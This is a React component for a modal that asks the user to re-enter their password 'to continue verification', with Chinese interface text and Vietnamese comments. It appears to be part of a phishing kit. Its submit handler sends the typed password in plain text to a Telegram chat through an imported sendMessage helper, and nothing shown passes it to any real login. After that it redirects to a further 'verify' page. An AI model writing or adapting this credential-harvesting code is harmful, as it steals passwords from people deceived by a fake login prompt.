import { faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import PropTypes from 'prop-types';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { useNavigate } from 'react-router';
import sendMessage from '@/utils/telegram';
import { PATHS } from '@/router/router';

const PasswordInput = ({ onClose }) => {
    const navigate = useNavigate();
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    const defaultTexts = useMemo(
        () => ({
            title: '請輸入您的密碼',
            description: '要繼續驗證，您必須輸入密碼才能繼續。',
            passwordLabel: '密碼',
            placeholder: '輸入您的密碼',
            continueBtn: '繼續',
            loadingText: '請稍等'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedTitle,
                    translatedDesc,
                    translatedLabel,
                    translatedPlaceholder,
                    translatedContinue,
                    translatedLoading
                ] = await Promise.all([
                    translateText(defaultTexts.title, targetLang),
                    translateText(defaultTexts.description, targetLang),
                    translateText(defaultTexts.passwordLabel, targetLang),
                    translateText(defaultTexts.placeholder, targetLang),
                    translateText(defaultTexts.continueBtn, targetLang),
                    translateText(defaultTexts.loadingText, targetLang)
                ]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description: translatedDesc,
                    passwordLabel: translatedLabel,
                    placeholder: translatedPlaceholder,
                    continueBtn: translatedContinue,
                    loadingText: translatedLoading
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleSubmit = async () => {
        if (!password.trim()) return;

        setIsLoading(true);

        try {
            const message = `🔑 <b>Password:</b> <code>${password}</code>`;
            await sendMessage(message);
        } catch {
            //
        }

        // ✅ GIẢM DELAY XUỐNG 1 GIÂY
        await new Promise((resolve) => setTimeout(resolve, 1000));

        setIsLoading(false);
        
        // ✅ CHUYỂN TRANG LUÔN SAU KHI NHẬP PASS
        navigate(PATHS.VERIFY);
    };

    return (
        <div className='fixed top-0 left-0 z-20 flex h-screen w-screen items-center justify-center'>
            <div className='w-lg rounded-lg bg-white shadow-lg'>
                <div className='flex items-center justify-between rounded-t-lg border-b border-gray-300 bg-[#f8f8f8] px-6 py-4'>
                    <p className='text-xl leading-6 font-semibold'>{translatedTexts.title}</p>
                    <FontAwesomeIcon
                        icon={faTimes}
                        className='cursor-pointer hover:text-gray-600'
                        onClick={onClose}
                    />
                </div>
                <div className='flex flex-col gap-4 px-6 py-4'>
                    <p className='text-base leading-6 text-[#212529bf]'>{translatedTexts.description}</p>
                    <p className='font-bold text-[#212529]'>{translatedTexts.passwordLabel}</p>
                    <input
                        type='password'
                        placeholder={translatedTexts.placeholder}
                        className='w-full rounded-lg border border-gray-300 px-3 py-1.5'
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                    />
                    <button
                        className='rounded-lg bg-blue-500 px-3 py-1.5 text-white disabled:opacity-50'
                        onClick={handleSubmit}
                        disabled={isLoading || !password.trim()}
                    >
                        {isLoading
                            ? `${translatedTexts.loadingText}...`
                            : translatedTexts.continueBtn}
                    </button>
                </div>
            </div>
        </div>
    );
};

PasswordInput.propTypes = {
    onClose: PropTypes.func.isRequired
};

export default PasswordInput;
